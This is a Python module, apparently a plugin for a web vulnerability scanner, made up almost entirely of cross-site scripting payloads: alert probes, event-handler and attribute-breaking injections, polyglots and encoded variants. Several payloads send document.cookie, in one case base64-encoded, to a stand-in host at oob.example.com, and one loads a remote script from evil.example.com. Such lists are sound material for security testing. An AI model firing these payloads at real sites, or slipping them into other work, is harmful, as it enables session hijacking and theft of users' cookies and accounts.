"""XSS payloads — reflected, stored, DOM, blind, polyglot."""

NAME = "Cross-Site Scripting"
DESCRIPTION = "Reflected, stored, DOM-based, blind XSS payloads and polyglots"
RISK = "MEDIUM"

PAYLOADS = [
    # Basic script injection
    "<script>alert(1)</script>",
    "<script>alert(document.cookie)</script>",
    "<script>fetch('https://oob.example.com/'+document.cookie)</script>",
    # Image onerror
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert(document.domain)>",
    "<img src=\"javascript:alert(1)\">",
    # SVG onload
    "<svg onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "<svg onload=alert(document.cookie)>",
    # Body onload
    "<body onload=alert(1)>",
    # Input onfocus
    "<input onfocus=alert(1) autofocus>",
    # Details with toggle
    "<details open ontoggle=alert(1)>",
    # Select with onfocus
    "<select onfocus=alert(1) autofocus>",
    # Iframe with srcdoc
    "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>",
    # Link with onmouseover
    "<a onmouseover=alert(1)>test</a>",
    # Video onerror
    "<video onerror=alert(1)><source></video>",
    # Audio onerror
    "<audio onerror=alert(1)><source></audio>",
    # Attribute-based
    "\" onmouseover=alert(1) \"",
    "' onmouseover=alert(1) '",
    "\" autofocus onfocus=alert(1) \"",
    # JavaScript pseudo-protocol
    "javascript:alert(1)",
    "JavaScript:alert(1)",
    # Polyglots
    "\"'></script><script>alert(1)</script>",
    "\" onclick=alert(1) \"",
    "' onclick=alert(1) '",
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "><script>alert(1)</script>",
    # Blind XSS
    "<script>fetch('https://oob.example.com/xss/'+btoa(document.cookie))</script>",
    "<img src=x onerror='this.src=\"https://oob.example.com/\"+document.cookie'>",
    # DOM-based
    "\" -alert(1)-\"",
    "';alert(1);//",
    "\\';alert(1);//",
    # Encoded variants
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    # Import scripts
    "<script src=\"https://evil.example.com/xss.js\"></script>",
]
